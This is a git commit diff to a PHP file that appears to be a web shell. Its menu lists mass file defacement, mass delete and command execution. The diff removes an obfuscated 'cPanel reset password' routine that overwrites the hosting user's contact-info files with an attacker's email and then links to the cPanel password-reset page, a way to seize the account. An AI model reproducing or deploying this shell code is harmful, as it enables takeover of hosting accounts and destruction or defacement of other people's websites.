f8a2564829c143959bca6258b2a90fb67c30c524
Z4PHY <mahardidono@gmail.com>
2024-02-22 14:22:52 +0700

    Z4PHY

--- other/tes.php
+++ other/tes.php
@@ -232,33 +232,12 @@ echo "</table>";
 echo "<center>";
 echo "<center><table id='menu' width='990' border='0' cellpadding='0' cellspacing='0'><tr><td>";
 echo "<a class='destroy_table' href='?'>Home</a>";
-echo "<a class='destroy_table' href='?dir=$dir&do=cmd'>cp_reset_pw</a>";
 echo "<a class='destroy_table' href='?logout=true'>Logout</a>";
 echo "<a class='destroy_table' href='?dir=$dir&to=mass'>Gasspoll!</a>";
 echo "<a class='destroy_table' href='?dir=$dir&to=masse'>Mass_delete</a><br>";
 echo "<a class='destroy_table' href='?dir=$dir&to=cmd'>Command</a>";
 echo "<a class='destroy_table' href='?dir=$dir&do=about'>About</a>";
 echo "</center>";
-if($_GET['do'] == 'cmd') {
-	echo'<header> 
-	<pre> 
-	- Cpanel Reset Password</pre> 
-	</header> 
-	</center> 
-	<form action="#" method="post"> 	 <input type="email" name="email" placeholder="Email Lu Tong" /> 	 <input type="submit" name="submit" value="Crack"/> 	 
-	</form> 	 	 
-	<br/><br/><br/> 
-	</p>'; ?> <?php $IIIIIIIIIIII = get_current_user(); $IIIIIIIIIII1 = $_SERVER['HTTP_HOST']; $IIIIIIIIIIlI = getenv('REMOTE_ADDR'); if (isset($_POST['submit'])) { $email = $_POST['email']; $IIIIIIIIIIl1 = 'email:' . $email; $IIIIIIIIII1I = fopen('/home/' . $IIIIIIIIIIII . '/.cpanel/contactinfo', 'w'); fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1); fclose($IIIIIIIIII1I); $IIIIIIIIII1I = fopen('/home/' . $IIIIIIIIIIII . '/.contactinfo', 'w'); fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1); fclose($IIIIIIIIII1I); $IIIIIIIIIlIl = "https://"; $IIIIIIIIIlI1 = "2083"; $IIIIIIIIIllI = $IIIIIIIIIII1 . ':2083/resetpass?start=1'; $read_named_conf = @file('/home/' . $IIIIIIIIIIII . '/.cpanel/contactinfo'); if(!$read_named_conf) { echo "<h1>Gak Bisa Di Akses Sayang??</h1>
-	<br><br> 
-	</pre>
-	</center>"; } else { echo "<center>Salin<br><br>
-	</center>"; echo '<center><input type="text" value="' . $IIIIIIIIIIII . '" id="user"> <button onclick="username()">Salin User</button></center> <script>function username() { var copyText = document.getElementById("user"); copyText.select(); document.execCommand("copy"); } </script> '; echo '<br/><center><a target="_blank" href="' . $IIIIIIIIIlIl . '' . $IIIIIIIIIllI . '">Gass Disini</a><br><br></center>'; ;}}
-	echo '</td></tr><tr><td>';
-	}
- elseif($_GET['logout'] == true) {
-	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
-	echo "<script>window.location='?';</script>";
-}
 
 if($_GET['to'] == 'mass') {
 	function sabun_massal($dir,$namafile,$isi_script) {
